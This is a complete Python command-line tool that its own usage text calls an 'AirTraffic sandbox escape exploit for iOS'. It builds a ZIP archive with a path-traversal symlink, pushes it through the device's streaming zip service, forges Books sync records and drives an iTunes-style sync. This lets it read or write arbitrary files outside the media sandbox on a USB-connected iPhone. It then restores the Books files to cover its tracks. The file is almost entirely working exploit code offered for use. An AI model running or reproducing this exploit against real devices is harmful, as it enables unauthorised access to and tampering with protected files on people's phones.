from __future__ import annotations

import argparse
import asyncio
import ctypes
import hashlib
import io
import json
import os
import platform
import plistlib
import posixpath
import secrets
import stat
import struct
import sys
import time
import uuid
import zipfile
from typing import Any

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.usbmux import list_devices as list_mux_devices

TESTED_BUILDS = frozenset({("27.0", "24A435"), ("27.0", "24A5390f")})
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SZ_EXTRA_ID = 0x5A53

TRACKED_FILES = (
    "Books/Books.plist", "Books/Sync/Books.plist", "Books/Sync/Upload.plist",
    "Books/Sync/Database/OutstandingAssets_4.sqlite",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-shm",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-wal",
)

TRACKED_DIRS = ("Books", "Books/Sync", "Books/Sync/Database")

APPLE_DLL_DIRS = (
    r"C:\Program Files\Common Files\Apple\Mobile Device Support",
    r"C:\Program Files\iTunes",
    r"C:\Program Files (x86)\Common Files\Apple\Mobile Device Support",
)

class AirLiftError(RuntimeError):
    def __init__(self, message: str, details: dict | None = None):
        super().__init__(message)
        self.details = details

_logging = False

def _log(msg: str):
    if _logging:
        print(msg, file=sys.stderr)

class AppleCF:
    def __init__(self):
        dll_dir = None
        for d in APPLE_DLL_DIRS:
            if os.path.isfile(os.path.join(d, "AirTrafficHost.dll")):
                dll_dir = d
                break
        if not dll_dir:
            raise AirLiftError("iTunes not installed — need Apple Mobile Device Support DLLs")

        for d in APPLE_DLL_DIRS:
            if os.path.isdir(d):
                os.add_dll_directory(d)

        self.cf = ctypes.CDLL(os.path.join(dll_dir, "CoreFoundation.dll"))
        self.at = ctypes.CDLL(os.path.join(dll_dir, "AirTrafficHost.dll"))

        vp = ctypes.c_void_p
        for fn, ret, args in [
            (self.cf.CFStringCreateWithCString,   vp, [vp, ctypes.c_char_p, ctypes.c_uint32]),
            (self.cf.CFStringGetCString,           ctypes.c_bool, [vp, ctypes.c_char_p, ctypes.c_int64, ctypes.c_uint32]),
            (self.cf.CFDataCreate,                 vp, [vp, vp, ctypes.c_int64]),
            (self.cf.CFDataGetLength,              ctypes.c_int64, [vp]),
            (self.cf.CFDataGetBytePtr,             vp, [vp]),
            (self.cf.CFPropertyListCreateData,     vp, [vp, vp, ctypes.c_int64, ctypes.c_int64, vp]),
            (self.cf.CFPropertyListCreateWithData, vp, [vp, vp, ctypes.c_int64, vp, vp]),
            (self.cf.CFRelease,                    None, [vp]),
            (self.at.ATHostConnectionCreate,       vp, [vp]),
            (self.at.ATHostConnectionReadMessage,  vp, [vp]),
            (self.at.ATHostConnectionRelease,      None, [vp]),
            (self.at.ATHostConnectionSendHostInfo, None, [vp, vp]),
            (self.at.ATHostConnectionSendSyncRequest, None, [vp, vp, vp, vp]),
            (self.at.ATHostConnectionSendMetadataSyncFinished, None, [vp, vp, vp]),
            (self.at.ATHostConnectionSendAssetCompleted, None, [vp, vp, vp, vp]),
            (self.at.ATCFMessageGetName,           vp, [vp]),
            (self.at.ATCFMessageGetParam,          vp, [vp, vp]),
        ]:
            if ret is not None:
                fn.restype = ret
            fn.argtypes = args

    def cfstr(self, s: str):
        return self.cf.CFStringCreateWithCString(None, s.encode(), 0x08000100)

    def cfstr_py(self, ref) -> str | None:
        if not ref:
            return None
        buf = ctypes.create_string_buffer(4096)
        self.cf.CFStringGetCString(ref, buf, 4096, 0x08000100)
        return buf.value.decode()

    def to_cf(self, obj):
        raw = plistlib.dumps(obj, fmt=plistlib.FMT_BINARY)
        data = self.cf.CFDataCreate(None, raw, len(raw))
        result = self.cf.CFPropertyListCreateWithData(None, data, 0, None, None)
        self.cf.CFRelease(data)
        return result

    def to_py(self, ref):
        if not ref:
            return None
        data = self.cf.CFPropertyListCreateData(None, ref, 200, 0, None)
        if not data:
            return None
        raw = ctypes.string_at(self.cf.CFDataGetBytePtr(data), self.cf.CFDataGetLength(data))
        self.cf.CFRelease(data)
        return plistlib.loads(raw)

    def release(self, *refs):
        for r in refs:
            if r:
                self.cf.CFRelease(r)

    def msg_name(self, msg) -> str | None:
        return self.cfstr_py(self.at.ATCFMessageGetName(msg)) if msg else None

def _atc_sync(apple: AppleCF, udid: str, ids: list[str], dests: list[str]):
    hi_dict = {
        "Type": "iTunes", "Version": "13.7.0.161",
        "MacOSVersion": platform.platform(), "SyncHostName": "airlift",
        "LibraryID": str(uuid.uuid4()).upper(),
        "SyncedDataclasses": ["Book"], "SyncedAssetTypes": ["Book"],
        "Wakeable": False,
    }

    ucf = apple.cfstr(udid)
    conn = apple.at.ATHostConnectionCreate(ucf)
    _log("Connecting to AirTraffic service...")
    if not conn:
        apple.release(ucf)
        raise AirLiftError("ATHostConnectionCreate failed")

    hi, dc, mt = apple.to_cf(hi_dict), apple.to_cf(["Book"]), apple.to_cf({})

    try:
        _wait(apple, conn, "SyncAllowed", 8)
        _log("SyncAllowed received, sending sync request...")
        apple.at.ATHostConnectionSendHostInfo(conn, hi)
        time.sleep(0.2)
        apple.at.ATHostConnectionSendSyncRequest(conn, dc, mt, hi)
        _wait(apple, conn, "ReadyForSync", 12)
        _log("ReadyForSync received, sending metadata...")

        st = apple.to_cf({"Book": 1})
        apple.at.ATHostConnectionSendMetadataSyncFinished(conn, st, mt)
        apple.release(st)

        _log("Waiting for asset manifest...")
        manifest = _read_manifest(apple, conn)
        if manifest is None:
            return

        known = {e["AssetID"] for e in manifest.get("Book", [])
                 if isinstance(e, dict) and e.get("IsDownload")}
        if any(i not in known for i in ids):
            raise AirLiftError("staged assets not in device manifest")

        for idx, (ident, dest) in enumerate(zip(ids, dests)):
            refs = apple.cfstr(ident), apple.cfstr("Book"), apple.cfstr(dest)
            apple.at.ATHostConnectionSendAssetCompleted(conn, *refs)
            apple.release(*refs)
            if idx + 1 < len(ids):
                time.sleep(0.9)
        time.sleep(2)
        _log("AirTraffic sync complete.")

    finally:
        apple.at.ATHostConnectionRelease(conn)
        apple.release(ucf, hi, dc, mt)

def _wait(apple, conn, target, limit):
    for _ in range(limit):
        msg = apple.at.ATHostConnectionReadMessage(conn)
        if not msg:
            continue
        name = apple.msg_name(msg)
        apple.release(msg)
        if name == target:
            return
        if name == "SyncFailed":
            raise AirLiftError("device rejected sync")
    raise AirLiftError(f"no {target} from device")

def _read_manifest(apple, conn):
    for _ in range(20):
        msg = apple.at.ATHostConnectionReadMessage(conn)
        if not msg:
            continue
        name = apple.msg_name(msg)
        if name == "AssetManifest":
            key = apple.cfstr("AssetManifest")
            result = apple.to_py(apple.at.ATCFMessageGetParam(msg, key)) or {}
            apple.release(key, msg)
            return result
        apple.release(msg)
        if name in ("SyncFailed", "SyncFinished"):
            return None
    return None

def _build_archive(target_dir: str, payload: bytes) -> bytes:
    tail = target_dir[1:]
    meta = plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True)

    def zi(name, mode):
        info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
        info.create_system = 3
        info.compress_type = zipfile.ZIP_STORED
        info.external_attr = (mode & 0xFFFF) << 16
        info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
        return info

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", allowZip64=False) as zf:
        zf.writestr(zi("META-INF/", stat.S_IFDIR | 0o755), b"")
        zf.writestr(zi("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600), meta)
        for d in ("p0/", "p0/p1/", "p0/p1/p2/"):
            zf.writestr(zi(d, stat.S_IFDIR | 0o755), b"")
        zf.writestr(zi("p0/p1/p2/link", stat.S_IFLNK | 0o777), f"../../../{tail}".encode())
        cursor = ""
        for part in tail.split("/"):
            cursor += part + "/"
            zf.writestr(zi(cursor, stat.S_IFDIR | 0o755), b"")
        zf.writestr(zi("payload", stat.S_IFREG | 0o600), payload)
    return buf.getvalue()

async def _afc_exists(afc, path):
    try:
        await afc.stat(path)
        return True
    except Exception:
        return False

async def _afc_rmtree(afc, path, depth=0):
    if depth > 32:
        return False
    try:
        info = await afc.stat(path)
    except Exception:
        return True
    if info.get("st_ifmt") == "S_IFDIR":
        try:
            for name in await afc.listdir(path):
                if name not in (".", ".."):
                    if not await _afc_rmtree(afc, posixpath.join(path, name), depth + 1):
                        return False
        except Exception:
            return False
    try:
        await afc.rm(path)
        return True
    except Exception:
        return False

async def _save_books(afc):
    saved = {}
    for path in TRACKED_FILES:
        try:
            saved[path] = await afc.get_file_contents(path)
        except Exception:
            saved[path] = None
    dirs = {d: await _afc_exists(afc, d) for d in TRACKED_DIRS}
    present = [p for p, v in saved.items() if v is not None]
    if present:
        _log(f"Preserving {len(present)} Books artifact{'s' * (len(present) != 1)}.")
    return saved, dirs

async def _restore_books(afc, saved, saved_dirs):
    for path, data in saved.items():
        try:
            if data is not None:
                for d in TRACKED_DIRS:
                    if path.startswith(d) and not await _afc_exists(afc, d):
                        await afc.makedirs(d)
                await afc.set_file_contents(path, data)
            elif await _afc_exists(afc, path):
                await afc.rm(path)
        except Exception:
            pass
    for d in reversed(TRACKED_DIRS):
        if not saved_dirs[d]:
            try:
                await afc.rm(d)
            except Exception:
                pass

async def _stage(lockdown, afc, src, ids, target_dir, payload):
    svc = await lockdown.start_lockdown_service("com.apple.streaming_zip_conduit")
    await svc.send_plist({"MediaSubdir": src})
    await svc.sendall(_build_archive(target_dir, payload))
    try:
        await asyncio.wait_for(svc.recv_plist(), timeout=30)
    except Exception:
        pass

    if not await _afc_exists(afc, f"{src}/payload"):
        raise AirLiftError("zip extraction failed")

    books = plistlib.dumps(
        {"Books": [{"Persistent ID": i, "Item ID": str(n), "DSID": "1"} for n, i in enumerate(ids, 1)]},
        fmt=plistlib.FMT_BINARY, sort_keys=True,
    )
    for d in ("Books", "Books/Sync"):
        if not await _afc_exists(afc, d):
            await afc.makedirs(d)
    await afc.set_file_contents("Books/Sync/Books.plist", books)

async def _cleanup(afc, src, lnk, rec, saved, saved_dirs):
    for p in (rec, lnk):
        try:
            await afc.rm(p)
        except Exception:
            pass
    await _afc_rmtree(afc, src)
    await asyncio.sleep(2)
    await _restore_books(afc, saved, saved_dirs)

async def _resolve_device(requested: str | None = None):
    mux = await list_mux_devices()
    if not mux:
        raise AirLiftError("no USB devices found")

    devices = []
    for md in mux:
        try:
            ld = await create_using_usbmux(serial=md.serial)
            pt = ld.product_type or ""
            if not pt.startswith("iPhone"):
                continue
            ver = ld.product_version or "unknown"
            bld = await ld.get_value(key="BuildVersion") or "unknown"
            nm = await ld.get_value(key="DeviceName") or pt
            devices.append({"udid": md.serial, "product": pt, "version": ver,
                            "build": bld, "name": nm,
                            "tested": (ver, bld) in TESTED_BUILDS, "lockdown": ld})
        except Exception:
            continue

    if not devices:
        raise AirLiftError("no paired iPhone found")

    if requested:
        for d in devices:
            if d["udid"].casefold() == requested.casefold():
                dev = d
                break
        else:
            raise AirLiftError("requested device not connected")
    elif len(devices) == 1:
        dev = devices[0]
    elif not sys.stdin.isatty():
        raise AirLiftError("multiple devices; pass --device UDID")
    else:
        print("Connected iPhones:", file=sys.stderr)
        for i, d in enumerate(devices, 1):
            print(f"  [{i}] {d['name']} \u00b7 {d['product']} \u00b7 iOS {d['version']} ({d['build']})", file=sys.stderr)
        while True:
            print("Select: ", end="", file=sys.stderr, flush=True)
            try:
                n = int(sys.stdin.readline().strip())
            except (ValueError, KeyboardInterrupt):
                n = 0
            if 1 <= n <= len(devices):
                dev = devices[n - 1]
                break
            print(f"Pick 1\u2013{len(devices)}.", file=sys.stderr)

    if not dev["tested"]:
        _log(f"Warning: iOS {dev['version']} ({dev['build']}) untested.")
    _log(f"Device: {dev['name']} ({dev['product']}) iOS {dev['version']} ({dev['build']}) [{dev['udid']}]")
    return dev

async def _write_file(lockdown, apple, udid, ios_path: str, data: bytes):
    target_dir = posixpath.dirname(ios_path)
    leaf = posixpath.basename(ios_path)

    tok = secrets.token_hex(10)
    src, lnk = f"airlift-src-{tok}", f"airlift-link-{tok}"

    link_id = f"../../{src}/p0/p1/p2/link"
    payload_id = f"../../{src}/payload"
    ids = [link_id, payload_id]
    dests = [lnk, posixpath.join(lnk, leaf)]

    afc = AfcService(lockdown=lockdown)
    await afc.connect()
    saved, saved_dirs = await _save_books(afc)

    try:
        await _stage(lockdown, afc, src, ids, target_dir, data)
        _log(f"Staged zip + Books.plist for {ios_path}")
        _log("Running AirTraffic sync...")
        _atc_sync(apple, udid, ids, dests)
        _log(f"Written {len(data)} bytes to {ios_path}")
    finally:
        await _cleanup(afc, src, lnk, None, saved, saved_dirs)

    return True

async def _read_file(lockdown, apple, udid, ios_path: str) -> bytes:
    target_dir = posixpath.dirname(ios_path)
    leaf = posixpath.basename(ios_path)

    tok = secrets.token_hex(10)
    src, lnk, rec = f"airlift-src-{tok}", f"airlift-link-{tok}", f"airlift-recovered-{tok}"

    link_id = f"../../{src}/p0/p1/p2/link"
    target_id = posixpath.relpath(ios_path, AIRLOCK_ROOT)
    ids = [link_id, target_id]
    dests = [lnk, rec]

    afc = AfcService(lockdown=lockdown)
    await afc.connect()
    saved, saved_dirs = await _save_books(afc)

    result = None
    try:
        await _stage(lockdown, afc, src, ids, target_dir, b"")
        _log(f"Staged read request for {ios_path}")
        _log("Running AirTraffic sync...")
        _atc_sync(apple, udid, ids, dests)
        _log("Waiting for file recovery...")
        for _ in range(60):
            try:
                result = await afc.get_file_contents(rec)
                break
            except Exception:
                pass
            await asyncio.sleep(0.25)
    finally:
        if result is not None:
            await _write_file(lockdown, apple, udid, ios_path, result)
        await _cleanup(afc, src, lnk, rec, saved, saved_dirs)

    if result is None:
        raise AirLiftError(f"could not read {ios_path}")
    _log(f"Read {len(result)} bytes from {ios_path}")
    return result

def _validate_path(ios_path):
    p = posixpath.normpath(ios_path)
    if not p.startswith("/"):
        raise AirLiftError("path must be absolute")
    if p.startswith("/var/mobile/Media"):
        raise AirLiftError("path must be outside /var/mobile/Media (AFC already covers that)")
    return p

async def _connect(device_udid=None):
    apple = AppleCF()
    dev = await _resolve_device(device_udid)
    return apple, dev

def write_file(ios_path: str, data: bytes, device: str | None = None) -> bool:
    ios_path = _validate_path(ios_path)
    async def go():
        apple, dev = await _connect(device)
        return await _write_file(dev["lockdown"], apple, dev["udid"], ios_path, data)
    return asyncio.run(go())

def read_file(ios_path: str, device: str | None = None) -> bytes:
    ios_path = _validate_path(ios_path)
    async def go():
        apple, dev = await _connect(device)
        return await _read_file(dev["lockdown"], apple, dev["udid"], ios_path)
    return asyncio.run(go())

USAGE = """\
AirTraffic sandbox escape exploit for iOS.

Usage:
    airlift.py write <ios_path> <local_file> [--device UDID] [--logging]
    airlift.py read <ios_path> <output_file> [--device UDID] [--logging]

Commands:
    write   Writes a local file to the connected device at the chosen path
    read    Reads a file from the device and saves it locally

Options:
    --device UDID   Selects a device from the UUID and skips the device picker
    --logging       Prints progress to console
"""

def main() -> int:
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
        print(USAGE)
        return 0

    p = argparse.ArgumentParser(add_help=False)
    p.add_argument("command")
    p.add_argument("args", nargs="*")
    p.add_argument("--device", metavar="UDID")
    p.add_argument("--logging", action="store_true")
    args = p.parse_args()

    global _logging
    _logging = args.logging

    try:
        if args.command == "write":
            if len(args.args) != 2:
                print("Usage: airlift.py write <ios_path> <local_file>", file=sys.stderr)
                return 1
            ios_path, local = args.args
            data = open(local, "rb").read()
            write_file(ios_path, data, device=args.device)
            print(json.dumps({"ok": True, "wrote": ios_path, "size": len(data)}))

        elif args.command == "read":
            if len(args.args) != 2:
                print("Usage: airlift.py read <ios_path> <output_file>", file=sys.stderr)
                return 1
            ios_path, output = args.args
            data = read_file(ios_path, device=args.device)
            open(output, "wb").write(data)
            print(json.dumps({"ok": True, "read": ios_path, "size": len(data), "saved": output}))


        else:
            print(USAGE)
            return 1

    except (AirLiftError, OSError, ValueError) as exc:
        print(json.dumps({"ok": False, "error": str(exc)}, sort_keys=True))
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
